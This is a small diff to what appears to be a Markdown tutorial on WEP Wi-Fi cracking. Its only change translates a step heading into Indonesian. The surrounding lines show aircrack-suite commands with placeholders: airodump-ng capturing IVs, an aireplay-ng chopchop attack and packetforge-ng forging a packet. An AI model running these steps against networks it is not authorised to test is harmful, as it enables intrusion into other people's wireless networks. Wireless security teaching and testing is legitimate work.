@@ -25,7 +25,7 @@ airodump-ng --bssid [bssid] --channel [channel] --ivs --write [output] [interfac
 aireplay-ng -4 -b [bssid] -h [mac_attacker] [interface]
 ```
 
-#### 5. Forge Packet
+#### 5. Buat Paket Palsu
 
 ```
 packetforge-ng -0 -a [bssid] -h [mac_attacker] -k 255.255.255.255 -l 255.255.255.255 -y [file_xor] -w [output]
